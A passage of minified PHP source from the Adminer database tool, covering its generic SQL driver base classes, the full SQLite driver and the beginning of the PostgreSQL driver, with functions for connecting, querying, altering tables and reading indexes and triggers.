SqlDb{static$instance;var$extension;var$flavor='';var$server_info;var$affected_rows=0;var$info='';var$errno=0;var$error='';protected$multi;abstract
function
attach($M,$V,$D);abstract
function
quote($Q);abstract
function
select_db($tb);abstract
function
query($F,$Mg=false);function
multi_query($F){return$this->multi=$this->query($F);}function
store_result(){return$this->multi;}function
next_result(){return
false;}}if(extension_loaded('pdo')){abstract
class
PdoDb
extends
SqlDb{protected$pdo;function
dsn($Jb,$V,$D,array$B=array()){$B[\PDO::ATTR_ERRMODE]=\PDO::ERRMODE_SILENT;$B[\PDO::ATTR_STATEMENT_CLASS]=array('Adminer\PdoResult');try{$this->pdo=new
\PDO($Jb,$V,$D,$B);}catch(\Exception$ac){return$ac->getMessage();}$this->server_info=@$this->pdo->getAttribute(\PDO::ATTR_SERVER_VERSION);return'';}function
quote($Q){return$this->pdo->quote($Q);}function
query($F,$Mg=false){$G=$this->pdo->query($F);$this->error="";if(!$G){list(,$this->errno,$this->error)=$this->pdo->errorInfo();if(!$this->error)$this->error=lang(21);return
false;}$this->store_result($G);return$G;}function
store_result($G=null){if(!$G){$G=$this->multi;if(!$G)return
false;}if($G->columnCount()){$G->num_rows=$G->rowCount();return$G;}$this->affected_rows=$G->rowCount();return
true;}function
next_result(){$G=$this->multi;if(!is_object($G))return
false;$G->_offset=0;return@$G->nextRowset();}}class
PdoResult
extends
\PDOStatement{var$_offset=0,$num_rows;function
fetch_assoc(){return$this->fetch_array(\PDO::FETCH_ASSOC);}function
fetch_row(){return$this->fetch_array(\PDO::FETCH_NUM);}private
function
fetch_array($ee){$H=$this->fetch($ee);return($H?array_map(array($this,'unresource'),$H):$H);}private
function
unresource($X){return(is_resource($X)?stream_get_contents($X):$X);}function
fetch_field(){$I=(object)$this->getColumnMeta($this->_offset++);$U=$I->pdo_type;$I->type=($U==\PDO::PARAM_INT?0:15);$I->charsetnr=($U==\PDO::PARAM_LOB||(isset($I->flags)&&in_array("blob",(array)$I->flags))?63:0);return$I;}function
seek($re){for($r=0;$r<$re;$r++)$this->fetch();}}}function
add_driver($s,$_){SqlDriver::$drivers[$s]=$_;}function
get_driver($s){return
SqlDriver::$drivers[$s];}abstract
class
SqlDriver{static$instance;static$drivers=array();static$extensions=array();static$jush;protected$conn;protected$types=array();var$insertFunctions=array();var$editFunctions=array();var$unsigned=array();var$operators=array();var$functions=array();var$grouping=array();var$onActions="RESTRICT|NO ACTION|CASCADE|SET NULL|SET DEFAULT";var$partitionBy=array();var$inout="IN|OUT|INOUT";var$enumLength="'(?:''|[^'\\\\]|\\\\.)*'";var$generated=array();static
function
connect($M,$V,$D){$g=new
Db;return($g->attach($M,$V,$D)?:$g);}function
__construct(Db$g){$this->conn=$g;}function
types(){return
call_user_func_array('array_merge',array_values($this->types));}function
structuredTypes(){return
array_map('array_keys',$this->types);}function
enumLength(array$l){}function
unconvertFunction(array$l){}function
select($R,array$K,array$Z,array$Gc,array$Ce=array(),$x=1,$C=0,$hf=false){$td=(count($Gc)<count($K));$F=adminer()->selectQueryBuild($K,$Z,$Gc,$Ce,$x,$C);if(!$F)$F="SELECT".limit(($_GET["page"]!="last"&&$x&&$Gc&&$td&&JUSH=="sql"?"SQL_CALC_FOUND_ROWS ":"").implode(", ",$K)."\nFROM ".table($R),($Z?"\nWHERE ".implode(" AND ",$Z):"").($Gc&&$td?"\nGROUP BY ".implode(", ",$Gc):"").($Ce?"\nORDER BY ".implode(", ",$Ce):""),$x,($C?$x*$C:0),"\n");$bg=microtime(true);$H=$this->conn->query($F);if($hf)echo
adminer()->selectQuery($F,$bg,!$H);return$H;}function
delete($R,$nf,$x=0){$F="FROM ".table($R);return
queries("DELETE".($x?limit1($R,$F,$nf):" $F$nf"));}function
update($R,array$N,$nf,$x=0,$L="\n"){$bh=array();foreach($N
as$w=>$X)$bh[]="$w = $X";$F=table($R)." SET$L".implode(",$L",$bh);return
queries("UPDATE".($x?limit1($R,$F,$nf,$L):" $F$nf"));}function
insert($R,array$N){return
queries("INSERT INTO ".table($R).($N?" (".implode(", ",array_keys($N)).")\nVALUES (".implode(", ",$N).")":" DEFAULT VALUES").$this->insertReturning($R));}function
insertReturning($R){return"";}function
insertUpdate($R,array$J,array$E){return
false;}function
begin(){return
queries("BEGIN");}function
commit(){return
queries("COMMIT");}function
rollback(){return
queries("ROLLBACK");}function
slowQuery($F,$tg){}function
convertSearch($t,array$X,array$l){return$t;}function
convertOperator($ze){return$ze;}function
value($X,array$l){return(method_exists($this->conn,'value')?$this->conn->value($X,$l):$X);}function
quoteBinary($Bf){return
q($Bf);}function
warnings(){}function
tableHelp($_,$wd=false){}function
inheritsFrom($R){return
array();}function
inheritedTables($R){return
array();}function
partitionsInfo($R){return
array();}function
hasCStyleEscapes(){return
false;}function
engines(){return
array();}function
supportsIndex(array$S){return!is_view($S);}function
indexAlgorithms(array$ig){return
array();}function
checkConstraints($R){return
get_key_vals("SELECT c.CONSTRAINT_NAME, CHECK_CLAUSE
FROM INFORMATION_SCHEMA.CHECK_CONSTRAINTS c
JOIN INFORMATION_SCHEMA.TABLE_CONSTRAINTS t ON c.CONSTRAINT_SCHEMA = t.CONSTRAINT_SCHEMA AND c.CONSTRAINT_NAME = t.CONSTRAINT_NAME
WHERE c.CONSTRAINT_SCHEMA = ".q($_GET["ns"]!=""?$_GET["ns"]:DB)."
AND t.TABLE_NAME = ".q($R)."
AND CHECK_CLAUSE NOT LIKE '% IS NOT NULL'",$this->conn);}function
allFields(){$H=array();if(DB!=""){foreach(get_rows("SELECT TABLE_NAME AS tab, COLUMN_NAME AS field, IS_NULLABLE AS nullable, DATA_TYPE AS type, CHARACTER_MAXIMUM_LENGTH AS length".(JUSH=='sql'?", COLUMN_KEY = 'PRI' AS `primary`":"")."
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_SCHEMA = ".q($_GET["ns"]!=""?$_GET["ns"]:DB)."
ORDER BY TABLE_NAME, ORDINAL_POSITION",$this->conn)as$I){$I["null"]=($I["nullable"]=="YES");$H[$I["tab"]][]=$I;}}return$H;}}add_driver("sqlite","SQLite");if(isset($_GET["sqlite"])){define('Adminer\DRIVER',"sqlite");if(class_exists("SQLite3")&&$_GET["ext"]!="pdo"){abstract
class
SqliteDb
extends
SqlDb{var$extension="SQLite3";private$link;function
attach($n,$V,$D){$this->link=new
\SQLite3($n);$dh=$this->link->version();$this->server_info=$dh["versionString"];return'';}function
query($F,$Mg=false){$G=@$this->link->query($F);$this->error="";if(!$G){$this->errno=$this->link->lastErrorCode();$this->error=$this->link->lastErrorMsg();return
false;}elseif($G->numColumns())return
new
Result($G);$this->affected_rows=$this->link->changes();return
true;}function
quote($Q){return(is_utf8($Q)?"'".$this->link->escapeString($Q)."'":"x'".first(unpack('H*',$Q))."'");}}class
Result{var$num_rows;private$result,$offset=0;function
__construct($G){$this->result=$G;}function
fetch_assoc(){return$this->result->fetchArray(SQLITE3_ASSOC);}function
fetch_row(){return$this->result->fetchArray(SQLITE3_NUM);}function
fetch_field(){$d=$this->offset++;$U=$this->result->columnType($d);return(object)array("name"=>$this->result->columnName($d),"type"=>($U==SQLITE3_TEXT?15:0),"charsetnr"=>($U==SQLITE3_BLOB?63:0),);}function
__destruct(){$this->result->finalize();}}}elseif(extension_loaded("pdo_sqlite")){abstract
class
SqliteDb
extends
PdoDb{var$extension="PDO_SQLite";function
attach($n,$V,$D){$this->dsn(DRIVER.":$n","","");$this->query("PRAGMA foreign_keys = 1");$this->query("PRAGMA busy_timeout = 500");return'';}}}if(class_exists('Adminer\SqliteDb')){class
Db
extends
SqliteDb{function
attach($n,$V,$D){parent::attach($n,$V,$D);$this->query("PRAGMA foreign_keys = 1");$this->query("PRAGMA busy_timeout = 500");return'';}function
select_db($n){if(is_readable($n)&&$this->query("ATTACH ".$this->quote(preg_match("~(^[/\\\\]|:)~",$n)?$n:dirname($_SERVER["SCRIPT_FILENAME"])."/$n")." AS a"))return!self::attach($n,'','');return
false;}}}class
Driver
extends
SqlDriver{static$extensions=array("SQLite3","PDO_SQLite");static$jush="sqlite";protected$types=array(array("integer"=>0,"real"=>0,"numeric"=>0,"text"=>0,"blob"=>0));var$insertFunctions=array();var$editFunctions=array("integer|real|numeric"=>"+/-","text"=>"||",);var$operators=array("=","<",">","<=",">=","!=","LIKE","LIKE %%","IN","IS NULL","NOT LIKE","NOT IN","IS NOT NULL","SQL");var$functions=array("hex","length","lower","round","unixepoch","upper");var$grouping=array("avg","count","count distinct","group_concat","max","min","sum");static
function
connect($M,$V,$D){if($D!="")return
lang(22);return
parent::connect(":memory:","","");}function
__construct(Db$g){parent::__construct($g);if(min_version(3.31,0,$g))$this->generated=array("STORED","VIRTUAL");}function
structuredTypes(){return
array_keys($this->types[0]);}function
insertUpdate($R,array$J,array$E){$bh=array();foreach($J
as$N)$bh[]="(".implode(", ",$N).")";return
queries("REPLACE INTO ".table($R)." (".implode(", ",array_keys(reset($J))).") VALUES\n".implode(",\n",$bh));}function
tableHelp($_,$wd=false){if($_=="sqlite_sequence")return"fileformat2.html#seqtab";if($_=="sqlite_master")return"fileformat2.html#$_";}function
checkConstraints($R){preg_match_all('~ CHECK *(\( *(((?>[^()]*[^() ])|(?1))*) *\))~',get_val("SELECT sql FROM sqlite_master WHERE type = 'table' AND name = ".q($R),0,$this->conn),$Td);return
array_combine($Td[2],$Td[2]);}function
allFields(){$H=array();foreach(tables_list()as$R=>$U){foreach(fields($R)as$l)$H[$R][]=$l;}return$H;}}function
idf_escape($t){return'"'.str_replace('"','""',$t).'"';}function
table($t){return
idf_escape($t);}function
get_databases($uc){return
array();}function
limit($F,$Z,$x,$re=0,$L=" "){return" $F$Z".($x?$L."LIMIT $x".($re?" OFFSET $re":""):"");}function
limit1($R,$F,$Z,$L="\n"){return(preg_match('~^INTO~',$F)||get_val("SELECT sqlite_compileoption_used('ENABLE_UPDATE_DELETE_LIMIT')")?limit($F,$Z,1,0,$L):" $F WHERE rowid = (SELECT rowid FROM ".table($R).$Z.$L."LIMIT 1)");}function
db_collation($i,$Wa){return
get_val("PRAGMA encoding");}function
logged_user(){return
get_current_user();}function
tables_list(){return
get_key_vals("SELECT name, type FROM sqlite_master WHERE type IN ('table', 'view') ORDER BY (name = 'sqlite_sequence'), name");}function
count_tables($ub){return
array();}function
table_status($_=""){$H=array();foreach(get_rows("SELECT name AS Name, type AS Engine, 'rowid' AS Oid, '' AS Auto_increment FROM sqlite_master WHERE type IN ('table', 'view') ".($_!=""?"AND name = ".q($_):"ORDER BY name"))as$I){$I["Rows"]=get_val("SELECT COUNT(*) FROM ".idf_escape($I["Name"]));$H[$I["Name"]]=$I;}foreach(get_rows("SELECT * FROM sqlite_sequence".($_!=""?" WHERE name = ".q($_):""),null,"")as$I)$H[$I["name"]]["Auto_increment"]=$I["seq"];return$H;}function
is_view($S){return$S["Engine"]=="view";}function
fk_support($S){return!get_val("SELECT sqlite_compileoption_used('OMIT_FOREIGN_KEY')");}function
fields($R){$H=array();$E="";foreach(get_rows("PRAGMA table_".(min_version(3.31)?"x":"")."info(".table($R).")")as$I){$_=$I["name"];$U=strtolower($I["type"]);$j=$I["dflt_value"];$H[$_]=array("field"=>$_,"type"=>(preg_match('~int~i',$U)?"integer":(preg_match('~char|clob|text~i',$U)?"text":(preg_match('~blob~i',$U)?"blob":(preg_match('~real|floa|doub~i',$U)?"real":"numeric")))),"full_type"=>$U,"default"=>(preg_match("~^'(.*)'$~",$j,$z)?str_replace("''","'",$z[1]):($j=="NULL"?null:$j)),"null"=>!$I["notnull"],"privileges"=>array("select"=>1,"insert"=>1,"update"=>1,"where"=>1,"order"=>1),"primary"=>$I["pk"],);if($I["pk"]){if($E!="")$H[$E]["auto_increment"]=false;elseif(preg_match('~^integer$~i',$U))$H[$_]["auto_increment"]=true;$E=$_;}}$Yf=get_val("SELECT sql FROM sqlite_master WHERE type = 'table' AND name = ".q($R));$t='(("[^"]*+")+|[a-z0-9_]+)';preg_match_all('~'.$t.'\s+text\s+COLLATE\s+(\'[^\']+\'|\S+)~i',$Yf,$Td,PREG_SET_ORDER);foreach($Td
as$z){$_=str_replace('""','"',preg_replace('~^"|"$~','',$z[1]));if($H[$_])$H[$_]["collation"]=trim($z[3],"'");}preg_match_all('~'.$t.'\s.*GENERATED ALWAYS AS \((.+)\) (STORED|VIRTUAL)~i',$Yf,$Td,PREG_SET_ORDER);foreach($Td
as$z){$_=str_replace('""','"',preg_replace('~^"|"$~','',$z[1]));$H[$_]["default"]=$z[3];$H[$_]["generated"]=strtoupper($z[4]);}return$H;}function
indexes($R,$h=null){$h=connection($h);$H=array();$Yf=get_val("SELECT sql FROM sqlite_master WHERE type = 'table' AND name = ".q($R),0,$h);if(preg_match('~\bPRIMARY\s+KEY\s*\((([^)"]+|"[^"]*"|`[^`]*`)++)~i',$Yf,$z)){$H[""]=array("type"=>"PRIMARY","columns"=>array(),"lengths"=>array(),"descs"=>array());preg_match_all('~((("[^"]*+")+|(?:`[^`]*+`)+)|(\S+))(\s+(ASC|DESC))?(,\s*|$)~i',$z[1],$Td,PREG_SET_ORDER);foreach($Td
as$z){$H[""]["columns"][]=idf_unescape($z[2]).$z[4];$H[""]["descs"][]=(preg_match('~DESC~i',$z[5])?'1':null);}}if(!$H){foreach(fields($R)as$_=>$l){if($l["primary"])$H[""]=array("type"=>"PRIMARY","columns"=>array($_),"lengths"=>array(),"descs"=>array(null));}}$ag=get_key_vals("SELECT name, sql FROM sqlite_master WHERE type = 'index' AND tbl_name = ".q($R),$h);foreach(get_rows("PRAGMA index_list(".table($R).")",$h)as$I){$_=$I["name"];$u=array("type"=>($I["unique"]?"UNIQUE":"INDEX"));$u["lengths"]=array();$u["descs"]=array();foreach(get_rows("PRAGMA index_info(".idf_escape($_).")",$h)as$Af){$u["columns"][]=$Af["name"];$u["descs"][]=null;}if(preg_match('~^CREATE( UNIQUE)? INDEX '.preg_quote(idf_escape($_).' ON '.idf_escape($R),'~').' \((.*)\)$~i',$ag[$_],$tf)){preg_match_all('/("[^"]*+")+( DESC)?/',$tf[2],$Td);foreach($Td[2]as$w=>$X){if($X)$u["descs"][$w]='1';}}if(!$H[""]||$u["type"]!="UNIQUE"||$u["columns"]!=$H[""]["columns"]||$u["descs"]!=$H[""]["descs"]||!preg_match("~^sqlite_~",$_))$H[$_]=$u;}return$H;}function
foreign_keys($R){$H=array();foreach(get_rows("PRAGMA foreign_key_list(".table($R).")")as$I){$o=&$H[$I["id"]];if(!$o)$o=$I;$o["source"][]=$I["from"];$o["target"][]=$I["to"];}return$H;}function
view($_){return
array("select"=>preg_replace('~^(?:[^`"[]+|`[^`]*`|"[^"]*")* AS\s+~iU','',get_val("SELECT sql FROM sqlite_master WHERE type = 'view' AND name = ".q($_))));}function
collations(){return(isset($_GET["create"])?get_vals("PRAGMA collation_list",1):array());}function
information_schema($i){return
false;}function
error(){return
h(connection()->error);}function
check_sqlite_name($_){$fc="db|sdb|sqlite";if(!preg_match("~^[^\\0]*\\.($fc)\$~",$_)){connection()->error=lang(23,str_replace("|",", ",$fc));return
false;}return
true;}function
create_database($i,$c){if(file_exists($i)){connection()->error=lang(24);return
false;}if(!check_sqlite_name($i))return
false;try{$y=new
Db();$y->attach($i,'','');}catch(\Exception$ac){connection()->error=$ac->getMessage();return
false;}$y->query('PRAGMA encoding = "UTF-8"');$y->query('CREATE TABLE adminer (i)');$y->query('DROP TABLE adminer');return
true;}function
drop_databases($ub){connection()->attach(":memory:",'','');foreach($ub
as$i){if(!@unlink($i)){connection()->error=lang(24);return
false;}}return
true;}function
rename_database($_,$c){if(!check_sqlite_name($_))return
false;connection()->attach(":memory:",'','');connection()->error=lang(24);return@rename(DB,$_);}function
auto_increment(){return" PRIMARY KEY AUTOINCREMENT";}function
alter_table($R,$_,$m,$wc,$ab,$Sb,$c,$ta,$Se){$Xg=($R==""||$wc);foreach($m
as$l){if($l[0]!=""||!$l[1]||$l[2]){$Xg=true;break;}}$b=array();$Ie=array();foreach($m
as$l){if($l[1]){$b[]=($Xg?$l[1]:"ADD ".implode($l[1]));if($l[0]!="")$Ie[$l[0]]=$l[1][0];}}if(!$Xg){foreach($b
as$X){if(!queries("ALTER TABLE ".table($R)." $X"))return
false;}if($R!=$_&&!queries("ALTER TABLE ".table($R)." RENAME TO ".table($_)))return
false;}elseif(!recreate_table($R,$_,$b,$Ie,$wc,$ta))return
false;if($ta){queries("BEGIN");queries("UPDATE sqlite_sequence SET seq = $ta WHERE name = ".q($_));if(!connection()->affected_rows)queries("INSERT INTO sqlite_sequence (name, seq) VALUES (".q($_).", $ta)");queries("COMMIT");}return
true;}function
recreate_table($R,$_,array$m,array$Ie,array$wc,$ta="",$v=array(),$Hb="",$ea=""){if($R!=""){if(!$m){foreach(fields($R)as$w=>$l){if($v)$l["auto_increment"]=0;$m[]=process_field($l,$l);$Ie[$w]=idf_escape($w);}}$gf=false;foreach($m
as$l){if($l[6])$gf=true;}$Ib=array();foreach($v
as$w=>$X){if($X[2]=="DROP"){$Ib[$X[1]]=true;unset($v[$w]);}}foreach(indexes($R)as$zd=>$u){$e=array();foreach($u["columns"]as$w=>$d){if(!$Ie[$d])continue
2;$e[]=$Ie[$d].($u["descs"][$w]?" DESC":"");}if(!$Ib[$zd]){if($u["type"]!="PRIMARY"||!$gf)$v[]=array($u["type"],$zd,$e);}}foreach($v
as$w=>$X){if($X[0]=="PRIMARY"){unset($v[$w]);$wc[]="  PRIMARY KEY (".implode(", ",$X[2]).")";}}foreach(foreign_keys($R)as$zd=>$o){foreach($o["source"]as$w=>$d){if(!$Ie[$d])continue
2;$o["source"][$w]=idf_unescape($Ie[$d]);}if(!isset($wc[" $zd"]))$wc[]=" ".format_foreign_key($o);}queries("BEGIN");}$Ka=array();foreach($m
as$l){if(preg_match('~GENERATED~',$l[3]))unset($Ie[array_search($l[0],$Ie)]);$Ka[]="  ".implode($l);}$Ka=array_merge($Ka,array_filter($wc));foreach(driver()->checkConstraints($R)as$Ma){if($Ma!=$Hb)$Ka[]="  CHECK ($Ma)";}if($ea)$Ka[]="  CHECK ($ea)";$ng=($R==$_?"adminer_$_":$_);if(!queries("CREATE TABLE ".table($ng)." (\n".implode(",\n",$Ka)."\n)"))return
false;if($R!=""){if($Ie&&!queries("INSERT INTO ".table($ng)." (".implode(", ",$Ie).") SELECT ".implode(", ",array_map('Adminer\idf_escape',array_keys($Ie)))." FROM ".table($R)))return
false;$Jg=array();foreach(triggers($R)as$Hg=>$ug){$Gg=trigger($Hg,$R);$Jg[]="CREATE TRIGGER ".idf_escape($Hg)." ".implode(" ",$ug)." ON ".table($_)."\n$Gg[Statement]";}$ta=$ta?"":get_val("SELECT seq FROM sqlite_sequence WHERE name = ".q($R));if(!queries("DROP TABLE ".table($R))||($R==$_&&!queries("ALTER TABLE ".table($ng)." RENAME TO ".table($_)))||!alter_indexes($_,$v))return
false;if($ta)queries("UPDATE sqlite_sequence SET seq = $ta WHERE name = ".q($_));foreach($Jg
as$Gg){if(!queries($Gg))return
false;}queries("COMMIT");}return
true;}function
index_sql($R,$U,$_,$e){return"CREATE $U ".($U!="INDEX"?"INDEX ":"").idf_escape($_!=""?$_:uniqid($R."_"))." ON ".table($R)." $e";}function
alter_indexes($R,$b){foreach($b
as$E){if($E[0]=="PRIMARY")return
recreate_table($R,$R,array(),array(),array(),"",$b);}foreach(array_reverse($b)as$X){if(!queries($X[2]=="DROP"?"DROP INDEX ".idf_escape($X[1]):index_sql($R,$X[0],$X[1],"(".implode(", ",$X[2]).")")))return
false;}return
true;}function
truncate_tables($T){return
apply_queries("DELETE FROM",$T);}function
drop_views($fh){return
apply_queries("DROP VIEW",$fh);}function
drop_tables($T){return
apply_queries("DROP TABLE",$T);}function
move_tables($T,$fh,$mg){return
false;}function
trigger($_,$R){if($_=="")return
array("Statement"=>"BEGIN\n\t;\nEND");$t='(?:[^`"\s]+|`[^`]*`|"[^"]*")+';$Ig=trigger_options();preg_match("~^CREATE\\s+TRIGGER\\s*$t\\s*(".implode("|",$Ig["Timing"]).")\\s+([a-z]+)(?:\\s+OF\\s+($t))?\\s+ON\\s*$t\\s*(?:FOR\\s+EACH\\s+ROW\\s)?(.*)~is",get_val("SELECT sql FROM sqlite_master WHERE type = 'trigger' AND name = ".q($_)),$z);$qe=$z[3];return
array("Timing"=>strtoupper($z[1]),"Event"=>strtoupper($z[2]).($qe?" OF":""),"Of"=>idf_unescape($qe),"Trigger"=>$_,"Statement"=>$z[4],);}function
triggers($R){$H=array();$Ig=trigger_options();foreach(get_rows("SELECT * FROM sqlite_master WHERE type = 'trigger' AND tbl_name = ".q($R))as$I){preg_match('~^CREATE\s+TRIGGER\s*(?:[^`"\s]+|`[^`]*`|"[^"]*")+\s*('.implode("|",$Ig["Timing"]).')\s*(.*?)\s+ON\b~i',$I["sql"],$z);$H[$I["name"]]=array($z[1],$z[2]);}return$H;}function
trigger_options(){return
array("Timing"=>array("BEFORE","AFTER","INSTEAD OF"),"Event"=>array("INSERT","UPDATE","UPDATE OF","DELETE"),"Type"=>array("FOR EACH ROW"),);}function
begin(){return
queries("BEGIN");}function
last_id($G){return
get_val("SELECT LAST_INSERT_ROWID()");}function
explain($g,$F){return$g->query("EXPLAIN QUERY PLAN $F");}function
found_rows($S,$Z){}function
types(){return
array();}function
create_sql($R,$ta,$dg){$H=get_val("SELECT sql FROM sqlite_master WHERE type IN ('table', 'view') AND name = ".q($R));foreach(indexes($R)as$_=>$u){if($_=='')continue;$H
.=";\n\n".index_sql($R,$u['type'],$_,"(".implode(", ",array_map('Adminer\idf_escape',$u['columns'])).")");}return$H;}function
truncate_sql($R){return"DELETE FROM ".table($R);}function
use_sql($tb){}function
trigger_sql($R){return
implode(get_vals("SELECT sql || ';;\n' FROM sqlite_master WHERE type = 'trigger' AND tbl_name = ".q($R)));}function
show_variables(){$H=array();foreach(get_rows("PRAGMA pragma_list")as$I){$_=$I["name"];if($_!="pragma_list"&&$_!="compile_options"){$H[$_]=array($_,'');foreach(get_rows("PRAGMA $_")as$I)$H[$_][1].=implode(", ",$I)."\n";}}return$H;}function
show_status(){$H=array();foreach(get_vals("PRAGMA compile_options")as$Ae)$H[]=explode("=",$Ae,2)+array('','');return$H;}function
convert_field($l){}function
unconvert_field($l,$H){return$H;}function
support($jc){return
preg_match('~^(check|columns|database|drop_col|dump|indexes|descidx|move_col|sql|status|table|trigger|variables|view|view_trigger)$~',$jc);}}add_driver("pgsql","PostgreSQL");if(isset($_GET["pgsql"])){define('Adminer\DRIVER',"pgsql");if(extension_loaded("pgsql")&&$_GET["ext"]!="pdo"){class
PgsqlDb
extends
SqlDb{var$extension="PgSQL";var$timeout=0;private$link,$string,$database=true;function
_error($Xb,$k){if(ini_bool("html_errors"))$k=html_entity_decode(strip_tags($k));$k=preg_replace('~^[^:]*: ~','',$k);$this->error=$k;}function
attach($M,$V,$D){$i=adminer()->database();set_error_handler(array($this,'_error'));$this->string="host='".str_replace(":","' port='",addcslashes($M,"'\\"))."' user='".addcslashes($V,"'\\")."' password='".addcslashes($D,"'\\")."'";$O=adminer()->connectSsl();if(isset($O["mode"]))$this->string
.=" sslmode='".$O["mode"]."'";$this->link=@pg_connect("$this->string dbname='".($i!=""?addcslashes($i,"'\\"):"postgres")."'",PGSQL_CONNECT_FORCE_NEW);if(!$this->link&&$i!=""){$this->database=false;$this->link=@pg_connect("$this->string dbname='postgres'",PGSQL_CONNECT_FORCE_NEW);}restore_error_handler();if($this->link)pg_set_client_encoding($this->link,"UTF8");return($this->link?'':$this->error);}function
quote($Q){return(function_exists('pg_escape_literal')?pg_escape_literal($this->link,$Q):"'".pg_escape_string($this->link,$Q)."'");}function
value($X,array$l){return($l["type"]=="bytea"&&$X!==null?pg_unescape_bytea($X):$X);}function
select_db($tb){if($tb==adminer()->database())return$this->database;$H=@pg_connect("$this->string dbname='".addcslashes($tb,"'\\")."'",PGSQL_CONNECT_FORCE_NEW);if($H)$this->link=$H;return$H;}function
close(){$this->link=@pg_connect("$this->string dbname='postgres'");}function
query($F,$Mg=false){$G=@pg_query($this->link,$F);$this->error="";if(!$G){$this->error=pg_last_error($this->link);$H=false;}elseif(!pg_num_fields($G)){$this->affected_rows=pg_affected_rows($G);$H=true;}else$H=new
Result($G);if($this->timeout){$this->timeout=0;$this->query("RESET statement_timeout");}return$H;}function
warnings(){return
h(pg_last_notice($this->link));}function
copyFrom($R,array$J){$this->error='';set_error_handler(function($Xb,$k){$this->error=(ini_bool('html_errors')?html_entity_decode($k):$k);return
true;});$H=pg_copy_from($this->link,$R,$J);restore_error_handler();return$H;}}class
Result{var$num_rows;private$result,$offset=0;function
__construct($G){$this->result=$G;$this->num_rows=pg_num_rows($G);}function
fetch_assoc(){return
pg_fetch_assoc($this->result);}function
fetch_row(){return
pg_fetch_row($this->result);}function
fetch_field(){$d=$this->offset++;$H=new
\stdClass;$H->orgtable=pg_field_table($this->result,$d);$H->name=pg_field_name($this->result,$d);$U=pg_field_type($this->result,$d);$H->type=(preg_match(number_type(),$U)?0:15);$H->charsetnr=($U=="bytea"?63:0);return$H;}function
__destruct(){pg_free_result($this->result);}}}elseif(extension_loaded("pdo_pgsql")){class
PgsqlDb
extends
PdoDb{var$extension="PDO_PgSQL";var$timeout=0;function
attach($M,$V,$D){$i=adminer()->database();$Jb="pgsql:host='".str_replace(":","' port='",addcslashes($M,"'\\"))."' client_encoding=utf8 dbname='".($i!=""?addcslashes($i,"'\\"):"postgres")."'";$O=adminer()->connectSsl();if(isset($O["mode"]))$Jb
.=" sslmode='".$O["mode"]."'";return$this->dsn($Jb,$V,$D);}function
select_db($tb){return(adminer()->database()==$tb);}function
query($F,$Mg=false){$H=parent::query($F,$Mg);if($this->timeout){$this->timeout=0;parent::query("RESET statement_timeout");}return$H;}function
warnings(){}function
copyFrom($R,array$J){$H=$this->pdo->pgsqlCopyFromArray($R,$J);$this->error=idx($this->pdo->errorInfo(),2)?:'';return$H;}function
close(){}}}if(class_exists('Adminer\PgsqlDb')){class
Db
extends
PgsqlDb{function
multi_query($F){if(preg_match('~\bCOPY\s+(.+?)\s+FROM\s+stdin;\n?(.*)\n\\\\\.$~is',str_replace("\r\n","\n",$F),$z)){$J=explode("\n",$z[2]);$this->affected_rows=count($J);return$this->copyFrom($z[1],$J);}return
parent::multi_query($F);}}}class
Driver
extends
SqlDriver{static$extensions=array("PgSQL","PDO_PgSQL");static$jush="pgsql";var$operators=array("=","<",">","<=",">=","!=","~","!~","LIKE","LIKE %%","ILIKE","ILIKE %%","IN","IS NULL","NOT LIKE","NOT ILIKE","NOT IN","IS NOT NULL");var$functions=array("char_length","lower","round","to_hex","to_timestamp","upper");var$grouping=array("avg","count","count distinct","max","min","sum");var$nsOid="(SELECT oid FROM pg_namespace WHERE nspname = current_schema())";static
function
connect($M,$V,$D){$g=parent::connect($M,$V,$D);if(is_string($g))return$g;$dh=get_val("SELECT version()",0,$g);$g->flavor=(preg_match('~CockroachDB~',$dh)?'cockroach':'');$g->server_info=preg_replace('~^\D*([\d.]+[-\w]*).*~','\1',$dh);if(min_version(9,0,$g))$g->query("SET application_name = 'Adminer'");if($g->flavor=='cockroach')add_driver(DRIVER,"CockroachDB");return$g;}function
__construct(Db$g){parent::__construct($g);$this->types=array(lang(25)=>array("smallint"=>5,"integer"=>10,"bigint"=>19,"boolean"=>1,"numeric"=>0,"real"=>7,"double precision"=>16,"money"=>20),lang(26)=>array("date"=>13,"time"=>17,"timestamp"=>20,"timestamptz"=>21,"interval"=>0),lang(27)=>array("character"=>0,"character varying"=>0,"text"=>0,"tsquery"=>0,"tsvector"=>0,"uuid"=>0,"xml"=>0),lang(28)=>array("bit"=>0,"bit varying"=>0,"bytea"=>0),lang(29)=>array("cidr"=>43,"inet"=>43,"macaddr"=>17,"macaddr8"=>23,"txid_snapshot"=>0),lang(30)=>array("box"=>0,"circle"=>0,"line"=>0,"lseg"=>0,"path"=>0,"point"=>0,"polygon"=>0),);if(min_version(9.2,0,$g)){$this->types[lang(27)]["json"]=4294967295;if(min_version(9.4,0,$g))$this->types[lang(27)]["jsonb"]=4294967295;}$this->insertFunctions=array("char"=>"md5","date|time"=>"now",);$this->editFunctions=array(number_type()=>"+/-","date|time"=>"+ interval/- interval","char|text"=>"||",);if(min_version(12,0,$g))$this->generated=array("STORED");$this->partitionBy=array("RANGE","LIST");if(!$g->flavor)$this->partitionBy[]="HASH";}function
enumLength(array$l){$Tb=$this->types[lang(31)][$l["type"]];return($Tb?type_values($Tb):"");}function
setUserTypes($Lg){$this->types[lang(31)]=array_flip($Lg);}function
insertReturning($R){$ta=array_filter(fields($R),function($l){return$l['auto_increment'];});return(count($ta)==1?" RETURNING ".idf_escape(key($ta)):"");}function
insertUpdate($R,array$J,array$E){foreach($J
as$N){$Ug=array();$Z=array();foreach($N
as$w=>$X){$Ug[]="$w = $X";if(isset($E[idf_unescape($w)]))$Z[]="$w = $X";}if(!(($Z&&queries("UPDATE ".table($R)." SET ".implode(", ",$Ug)." WHERE ".implode(" AND ",$Z))&&connection()->affected_rows)||queries("INSERT INTO ".table($R)." (".implode(", ",array_keys($N)).") VALUES (".implode(", ",$N).")")))return
false;}return
true;}function
slowQuery($F,$tg){$this->conn->query("SET statement_timeout = ".(1000*$tg));$this->conn->timeout=1000*$tg;return$F;}function
convertSearch($t,array$X,array$l){$pg="char|text";if(strpos($X["op"],"LIKE")===false)$pg
.="|date|time(stamp)?|boolean|uuid|inet|cidr|macaddr|".number_type();return(preg_match("~$pg~",$l["type"])?$t:"CAST($t AS text)");}function
quoteBinary($Bf){return"'\\x".bin2hex($Bf)."'";}function
warnings(){return$this->conn->warnings();}function
